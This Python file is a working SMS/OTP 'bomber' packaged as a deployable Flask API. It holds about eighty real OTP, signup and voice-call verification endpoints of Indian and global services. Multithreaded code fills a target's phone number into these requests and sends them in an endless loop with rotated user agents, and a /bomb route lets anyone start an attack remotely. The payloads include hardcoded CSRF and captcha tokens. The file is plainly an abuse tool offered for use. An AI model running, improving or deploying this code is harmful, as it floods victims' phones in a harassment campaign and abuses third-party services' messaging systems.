# ============================================
# brutal_api_final.py
# DEAD APIS REMOVED — RENDER DEPLOY READY
# ============================================

import requests
import json
import time
import random
import sys
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from flask import Flask, request, jsonify

app = Flask(__name__)

# ====== GLOBAL VARIABLES ======
running = True
success_lock = Lock()
failed_lock = Lock()

def signal_handler(sig, frame):
    global running
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ====== JBOMBER.JAVA SE ======
JBOMBER_APIS = [
    {"name": "flipkart_jb", "url": "https://rome.api.flipkart.com/api/7/user/otp/generate", "method": "POST", "payload": {"loginId": "+91{num}", "supportAllStates": True}},
    {"name": "altbalaji_jb", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify", "method": "POST", "params": {"domain": "IN"}, "payload": {"phone_number": "{num}", "country_code": "91", "platform": "web"}},
    {"name": "sonyliv", "url": "https://apiv2.sonyliv.com/AGL/1.4/A/ENG/WEB/IN/CREATEOTP", "method": "POST", "payload": {"channelPartnerID": "MSMIND", "mobileNumber": "{num}", "country": "IN"}},
    {"name": "olacabs_jb", "url": "https://drive.olacabs.com/oauth/api/v2/web/auth/preauth", "method": "POST", "payload": {"auth_scheme": "OTP", "provider": "IMSSuvidhaAuth", "credential": {"dialingCode": "+91", "mobileNumber": "{num}"}}},
    {"name": "yatra", "url": "https://secure.yatra.com/social/common/yatra/sendMobileOTP", "method": "POST", "payload": {"isdCode": "91", "mobileNumber": "{num}"}},
    {"name": "unacademy_jb", "url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST", "payload": {"phone": "{num}", "country_code": "IN", "otp_type": 1, "email": "", "send_otp": True, "is_un_teach_user": False}},
    {"name": "bigbasket", "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", "method": "POST", "payload": {"identifier": "{num}"}},
    {"name": "1mg", "url": "https://www.1mg.com/auth_api/v4/create_token", "method": "POST", "payload": {"number": "{num}", "is_corporate_user": False, "is_doctor": False}},
    {"name": "dominos_jb", "url": "https://api.dominos.co.in/loginhandler/forgotpassword", "method": "POST", "payload": {"lastName": "", "mobile": "{num}", "firstName": ""}},
    {"name": "swiggy_jb", "url": "https://www.swiggy.com/dapi/auth/signup", "method": "POST", "payload": {"mobile": "{num}", "name": "hindu bhai", "email": "gzespbhyujvyujhhjvortz@gmail.com", "password": "asAS@123", "referral": "", "otp": "", "_csrf": "iqNGOe7pRjiH-PiHc1Vo4Ss-PJbiuQ0mm_tI7-Ig"}},
    {"name": "pizzahut_jb", "url": "https://api.pizzahut.io/v1/otp/generate", "method": "POST", "payload": {"phone": "+91{num}"}},
    {"name": "timesprime", "url": "https://jsso.indiatimes.com/sso/crossapp/identity/web/registerUser", "method": "POST", "payload": {"firstName": "Guest", "lastName": None, "gender": None, "dob": None, "mobile": "{num}", "password": "tp@9681095", "isSendOffer": False, "termsAccepted": None, "shareDataAllowed": None, "timespointsPolicy": None}},
    {"name": "gaana", "url": "https://gaanajsso.indiatimes.com/sso/crossapp/identity/web/getLoginOtp", "method": "POST", "payload": {"mobile": "+91-{num}"}},
    {"name": "dineout", "url": "https://www.dineout.co.in/xhr-request/user_signup", "method": "POST", "payload": {"name": "rohanmehta", "email": "", "phone": "{num}"}},
    {"name": "digitallocker", "url": "https://accounts.digitallocker.gov.in/signup/send_otp", "method": "POST", "payload": {"aadhaar_mobile": "{num}"}},
    {"name": "box8", "url": "https://accounts.box8.co.in/customers/sign_up", "method": "POST", "params": {"origin": "box8"}, "payload": {"phone_no": "{num}", "name": "kannu nagar", "email": "mrkhan@ggail.com", "password": "dfGK@173"}},
    {"name": "curefit", "url": "https://www.cure.fit/api/auth/loginPhoneSendOtp", "method": "POST", "payload": {"phone": "{num}", "countryCallingCode": "+91"}},
    {"name": "firstcry", "url": "https://www.firstcry.com/m/register", "method": "POST", "payload": {"redirecturl": "https://www.firstcry.com", "notemail": "2", "by": "1", "onetab": "", "FcSocialToken": "", "usrname": "rihanna luton", "usrmb": "{num}", "usremail": "hazzzel@ggail.com", "usrpass": "dsLS@173"}},
    {"name": "snapdeal_jb", "url": "https://www.snapdeal.com/signupAjax/", "method": "POST", "payload": {"j_number": "{num}", "j_username": "mrkjan@ggail.com", "j_name": "rihan lovely", "j_dob": "25/06/1995", "j_password": "dlRS@123", "j_confpassword": "asAS@123", "CSRFToken": "b6835b70f73f87649f7b37501b6cd584fb921232", "targetUrl": "", "mobileStart": "true", "numberEdit": "false"}},
    {"name": "fynd", "url": "https://api.fynd.com/auth/auth/login-or-register/otp", "method": "POST", "params": {"platform": "000000000000000000000001"}, "payload": {"mobile": "{num}", "countryCode": "91", "g-recaptcha-response": "grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNTkzMTUwOTAwNjkyfQ.pYjj_Y7j0wS2zmJ3xfYS8V8BgGVxylSMSM092MYqno8"}},
    {"name": "vedantu", "url": "https://user.vedantu.com/user/preLoginVerification", "method": "POST", "payload": {"email": None, "phoneCode": "+91", "phoneNumber": "{num}", "ver": "11.230"}},
    {"name": "skout", "url": "https://www.skout.com/api/1/auth/verify-phone", "method": "POST", "payload": {"application_code": "d46dbe487d5baaa0b176cb55d3bc452c", "phone": "+91{num}", "countryCode": "IN"}},
    {"name": "trulymadly", "url": "https://app.trulymadly.com/api/v2/auth/otp/send", "method": "POST", "payload": {"mobile": "{num}", "country_code": 91}},
]

# ====== TBOMB SE ======
TBOMB_APIS = [
    {"name": "oyorooms", "url": "https://www.oyorooms.com/api/pwa/generateotp", "method": "POST", "payload": {"country_code": "+91", "nod": "4", "phone": "{num}"}},
    {"name": "delhivery", "url": "https://direct.delhivery.com/delhiverydirect/order/generate-otp", "method": "POST", "payload": {"phoneNo": "{num}"}},
    {"name": "confirmtkt", "url": "https://securedapi.confirmtkt.com/api/platform/register", "method": "GET", "params": {"mobileNumber": "{num}"}},
    {"name": "pharmeasy", "url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "payload": {"contactNumber": "{num}"}},
    {"name": "indialends", "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx", "method": "POST", "payload": {"aeyder03teaeare": "1", "ertysvfj74sje": "91", "jfsdfu14hkgertd": "{num}", "lj80gertdfg": "0"}},
    {"name": "flipkart_tb", "url": "https://www.flipkart.com/api/6/user/signup/status", "method": "POST", "payload": {"loginId": ["+91{num}"], "supportAllStates": True}},
    {"name": "flipkart_otp_tb", "url": "https://www.flipkart.com/api/5/user/otp/generate", "method": "POST", "payload": {"loginId": "+91{num}", "state": "VERIFIED", "churnEmailRequest": "false"}},
    {"name": "lenskart_tb", "url": "https://www.ref-r.com/clients/lenskart/smsApi", "method": "POST", "payload": {"mobile": "{num}", "submit": "1"}},
    {"name": "practo", "url": "https://accounts.practo.com/send_otp", "method": "POST", "payload": {"client_name": "Practo Android App", "mobile": "+91{num}", "fingerprint": "", "device_name": "samsung+SM-G9350"}},
    {"name": "pizzahut_tb", "url": "https://m.pizzahut.co.in/api/cart/send-otp", "method": "POST", "payload": {"customer": {"MobileNo": "{num}", "UserName": "{num}", "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}},
    {"name": "goibibo", "url": "https://www.goibibo.com/common/downloadsms/", "method": "POST", "payload": {"mbl": "{num}"}},
    {"name": "apollopharmacy", "url": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "ajio_tb", "url": "https://www.ajio.com/api/auth/signupSendOTP", "method": "POST", "payload": {"firstName": "SpeedX", "login": "johnyaho@gmail.com", "password": "Rock@5star", "genderType": "Male", "mobileNumber": "{num}", "requestType": "SENDOTP"}},
    {"name": "altbalaji_tb", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify", "method": "POST", "params": {"domain": "IN"}, "payload": {"country_code": "91", "phone_number": "{num}"}},
    {"name": "grab", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "payload": {"method": "SMS", "countryCode": "id", "phoneNumber": "91{num}", "templateID": "pax_android_production"}},
    {"name": "makaan", "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{num}", "method": "GET", "params": {"callType": "otpOnCall"}},
    {"name": "olx", "url": "https://www.olx.in/api/challenges", "method": "POST", "payload": {"type": "call", "descriptor": "+91{num}"}},
    {"name": "magicbricks", "url": "https://api.magicbricks.com/bricks/verifyOnCall.html", "method": "GET", "params": {"mobile": "{num}"}},
    {"name": "myupchar", "url": "https://www.myupchar.com/user_profile/resend_otp_via_voice", "method": "GET", "params": {"id": "{num}"}},
]

# ====== CONFIG.JSON SE ======
CONFIG_APIS = [
    {"name": "justdial", "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php", "method": "GET", "params": {"mobile": "{num}"}},
    {"name": "frotels", "url": "https://www.frotels.com/appsendsms.php", "method": "POST", "payload": {"mobno": "{num}"}},
    {"name": "gapoon", "url": "https://www.gapoon.com/userSignup", "method": "POST", "payload": {"mobile": "{num}", "email": "a@a.com", "name": "a"}},
    {"name": "housing", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "payload": {"phone": "{num}"}},
    {"name": "porter", "url": "https://porter.in/restservice/send_app_link_sms", "method": "POST", "payload": {"phone": "{num}", "referrer_string": "", "brand": "porter"}},
    {"name": "cityflo", "url": "https://cityflo.com/website-app-download-link-sms/", "method": "POST", "payload": {"mobile_number": "{num}"}},
    {"name": "nnnow", "url": "https://api.nnnow.com/d/api/appDownloadLink", "method": "POST", "payload": {"mobileNumber": "{num}"}},
    {"name": "happyeasygo", "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do", "method": "GET", "params": {"phone": "91 {num}"}},
    {"name": "treebo", "url": "https://www.treebo.com/api/v2/auth/login/otp/", "method": "POST", "payload": {"phone_number": "{num}"}},
    {"name": "mobikwik", "url": "https://webapi.mobikwik.com/p/account/otp/cell/v2", "method": "POST", "payload": {"cell": "{num}"}},
    {"name": "airtel", "url": "https://www.airtel.in/referral-api/core/notify", "method": "GET", "params": {"messageId": "map", "rtn": "{num}"}},
    {"name": "mylescars", "url": "https://www.mylescars.com/usermanagements/chkContact", "method": "POST", "payload": {"contactNo": "{num}"}},
    {"name": "grofers", "url": "https://grofers.com/v2/accounts/", "method": "POST", "payload": {"user_phone": "{num}"}},
    {"name": "dream11", "url": "https://api.dream11.com/sendsmslink", "method": "POST", "payload": {"siteId": "1", "mobileNum": "{num}", "appType": "androidfull"}},
    {"name": "cashify", "url": "https://www.cashify.in/api/cu01/v1/app-link", "method": "GET", "params": {"mn": "{num}"}},
    {"name": "paytm", "url": "https://commonfront.paytm.com/v4/api/sendsms", "method": "POST", "payload": {"phone": "{num}", "guid": "2952fa812660c58dc160ca6c9894221d"}}
]

# ====== MERI APIS ======
MY_APIS = [
    {"name": "amazon", "url": "https://www.amazon.in/ap/signin", "method": "POST", "payload": {"phoneNumber": "{num}"}},
    {"name": "snapdeal_my", "url": "https://www.snapdeal.com/sendOTP", "method": "POST", "payload": {"emailId": "", "mobileNumber": "{num}", "purpose": "LOGIN_WITH_MOBILE_OTP"}},
    {"name": "jiomart", "url": "https://www.jiomart.com/mst/rest/v1/id/details/{num}", "method": "GET"},
    {"name": "uber", "url": "https://login.uber.com/api/v1/users/sms", "method": "POST", "payload": {"phone": "+91{num}"}},
    {"name": "ola_my", "url": "https://auth.olacabs.com/v1/user/sendotp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "swiggy_my", "url": "https://www.swiggy.com/api/v1/auth/otp", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "zomato", "url": "https://www.zomato.com/php/authenticate", "method": "POST", "payload": {"mobile": "{num}"}},
    {"name": "instagram", "url": "https://www.instagram.com/api/v1/accounts/send_phone_verification/", "method": "POST", "payload": {"phone_number": "{num}"}},
    {"name": "facebook", "url": "https://www.facebook.com/login/identify/", "method": "POST", "payload": {"email": "{num}@phone.com"}},
    {"name": "whatsapp", "url": "https://web.whatsapp.com/airgram/sendCode", "method": "POST", "payload": {"phoneNumber": "{num}"}},
    {"name": "telegram", "url": "https://auth.telegram.org/api/sendCode", "method": "POST", "payload": {"phone_number": "+91{num}"}},
    {"name": "snapchat", "url": "https://accounts.snapchat.com/accounts/otp/send", "method": "POST", "payload": {"phoneNumber": "+91{num}"}},
    {"name": "discord", "url": "https://discord.com/api/v9/auth/phone", "method": "POST", "payload": {"phone": "+91{num}"}},
    {"name": "reddit", "url": "https://www.reddit.com/api/v1/register", "method": "POST", "payload": {"phone": "+91{num}"}},
    {"name": "linkedin", "url": "https://www.linkedin.com/uas/otp/request", "method": "POST", "payload": {"phoneNumber": "{num}"}},
    {"name": "github", "url": "https://github.com/sessions/phone/send-otp", "method": "POST", "payload": {"phone": "+91{num}"}},
    {"name": "google", "url": "https://accounts.google.com/_/signin/sms", "method": "POST", "payload": {"phoneNumber": "+91{num}"}},
    {"name": "microsoft", "url": "https://login.microsoftonline.com/common/GetCredentialType", "method": "POST", "payload": {"Username": "+91{num}"}},
    {"name": "spotify", "url": "https://spclient.wg.spotify.com/identity/signup/validate", "method": "POST", "payload": {"phone": "+91{num}"}},
    {"name": "netflix", "url": "https://www.netflix.com/api/shakti/identity/validate", "method": "POST", "payload": {"phone": "+91{num}"}},
    {"name": "airbnb", "url": "https://www.airbnb.com/api/v2/phone_verification", "method": "POST", "payload": {"phone": "+91{num}"}},
    {"name": "tinder", "url": "https://api.gotinder.com/v2/auth/sms/send", "method": "POST", "payload": {"phone_number": "{num}"}},
    {"name": "quora", "url": "https://www.quora.com/api/v1/email/otp", "method": "POST", "payload": {"phone": "+91{num}"}}
]

# ====== SAB MERGE (TERI_APIS REMOVED) ======
ALL_APIS = JBOMBER_APIS + TBOMB_APIS + CONFIG_APIS + MY_APIS

# Dead APIs remove
DEAD_NAMES = ["meru", "freshmenu", "limeroad", "byjus", "protonmail", "mewe", "heromotocorp", "aala", "realestateindia"]
ALL_APIS = [api for api in ALL_APIS if api["name"] not in DEAD_NAMES]

# Remove duplicates
seen = set()
UNIQUE_APIS = []
for api in ALL_APIS:
    key = (api["name"], api["url"])
    if key not in seen:
        seen.add(key)
        UNIQUE_APIS.append(api)
ALL_APIS = UNIQUE_APIS

print(f"✅ Total APIs Loaded: {len(ALL_APIS)}")

# ====== USER-AGENTS ======
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
]

# ====== BOMBER CLASS ======
class BrutalBomber:
    def __init__(self, number, threads=50, delay=0.005):
        self.number = number
        self.threads = threads
        self.delay = delay
        self.success = 0
        self.failed = 0
        self.total = 0
        self.api_stats = {}
        self.start_time = time.time()
        self.session = requests.Session()
    
    def _send(self, api):
        global running
        if not running:
            return False
        
        time.sleep(self.delay)
        
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json"
            }
            
            url = api["url"]
            if "{num}" in url:
                url = url.replace("{num}", self.number)
            
            payload = {}
            if "payload" in api:
                for key, value in api["payload"].items():
                    if isinstance(value, str) and "{num}" in value:
                        payload[key] = value.replace("{num}", self.number)
                    elif isinstance(value, list):
                        payload[key] = [v.replace("{num}", self.number) if isinstance(v, str) else v for v in value]
                    elif isinstance(value, dict):
                        payload[key] = {}
                        for k, v in value.items():
                            if isinstance(v, str) and "{num}" in v:
                                payload[key][k] = v.replace("{num}", self.number)
                            else:
                                payload[key][k] = v
                    else:
                        payload[key] = value
            
            if "params" in api:
                params = {}
                for key, value in api["params"].items():
                    params[key] = value.replace("{num}", self.number) if isinstance(value, str) and "{num}" in value else value
                resp = self.session.get(url, params=params, headers=headers, timeout=5)
            elif api.get("method", "POST").upper() == "POST":
                resp = self.session.post(url, json=payload, headers=headers, timeout=5)
            else:
                resp = self.session.get(url, params=payload, headers=headers, timeout=5)
            
            if resp.status_code in [200, 201, 202, 204]:
                with success_lock:
                    self.success += 1
                    self.total += 1
                self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) + 1
                return True
            with failed_lock:
                self.failed += 1
                self.total += 1
            self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) - 1
            return False
        except:
            with failed_lock:
                self.failed += 1
                self.total += 1
            self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) - 1
            return False
    
    def start(self):
        global running
        print("\n" + "="*60)
        print("🔥 BRUTAL BOMBER — RENDER EDITION 🔥")
        print("="*60)
        print(f"📱 Target: {self.number}")
        print(f"🧵 Threads: {self.threads}")
        print(f"⏱️  Delay: {self.delay} sec")
        print(f"📡 APIs: {len(ALL_APIS)}")
        print("="*60)
        print("💀 INFINITY BOMBING STARTED!")
        print("🛑 CTRL+C to stop\n")
        
        cycle = 0
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while running:
                cycle += 1
                futures = [executor.submit(self._send, api) for api in ALL_APIS]
                for future in as_completed(futures):
                    if not running:
                        break
                    future.result()
                
                elapsed = int(time.time() - self.start_time)
                rate = self.success / elapsed if elapsed > 0 else 0
                print(f"🔄 Cycle {cycle} | ✅ {self.success} | ❌ {self.failed} | ⚡ {rate:.1f} SMS/sec")
        
        elapsed = int(time.time() - self.start_time)
        print("\n" + "="*60)
        print("📊 FINAL REPORT")
        print("="*60)
        print(f"⏱️  Time: {elapsed}s")
        print(f"✅ SMS: {self.success}")
        print(f"❌ Failed: {self.failed}")
        print(f"⚡ Speed: {self.success/elapsed:.1f} SMS/sec" if elapsed > 0 else "")
        print("\n🏆 TOP APIS:")
        for name, score in sorted(self.api_stats.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"   {'✅' if score > 0 else '❌'} {name}: {score}")
        print("="*60)
        return {
            "target": self.number,
            "total_apis": len(ALL_APIS),
            "successful": self.success,
            "failed": self.failed,
            "speed": f"{self.success/elapsed:.1f} SMS/sec" if elapsed > 0 else "N/A",
            "time": f"{elapsed}s"
        }

# ====== FLASK API ======
@app.route('/')
def home():
    return {
        "status": "🔥 BRUTAL BOMBER API 🔥",
        "version": "3.0",
        "total_apis": len(ALL_APIS),
        "endpoints": {
            "/bomb": "POST/GET with phone parameter",
            "/health": "Health check for Uptime Robot"
        }
    }

@app.route('/bomb', methods=['GET', 'POST'])
def bomb():
    global running
    
    if request.method == 'GET':
        phone = request.args.get('phone')
        cycles = int(request.args.get('cycles', 999999))
        threads = int(request.args.get('threads', 50))
        delay = float(request.args.get('delay', 0.005))
    else:
        data = request.get_json() or {}
        phone = data.get('phone')
        cycles = data.get('cycles', 999999)
        threads = data.get('threads', 50)
        delay = data.get('delay', 0.005)
    
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"status": "error", "message": "Phone number must be 10 digits"}), 400
    
    running = True
    bomber = BrutalBomber(phone, threads, delay)
    
    try:
        result = bomber.start()
        return jsonify({"status": "success", "result": result})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "uptime": "100%",
        "version": "3.0",
        "total_apis": len(ALL_APIS),
        "threads": 50,
        "delay": "0.005s",
        "mode": "infinite_loop"
    })

@app.route('/stop')
def stop():
    global running
    running = False
    return jsonify({"status": "stopped", "message": "Bombing stopped successfully"})

@app.route('/stats')
def stats():
    return jsonify({
        "total_apis": len(ALL_APIS),
        "dead_apis_removed": len(DEAD_NAMES),
        "threads": 50,
        "delay": "0.005s",
        "mode": "infinite_loop",
        "sources": {
            "jbomber_apis": len(JBOMBER_APIS),
            "tbomb_apis": len(TBOMB_APIS),
            "config_apis": len(CONFIG_APIS),
            "my_apis": len(MY_APIS)
        }
    })

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)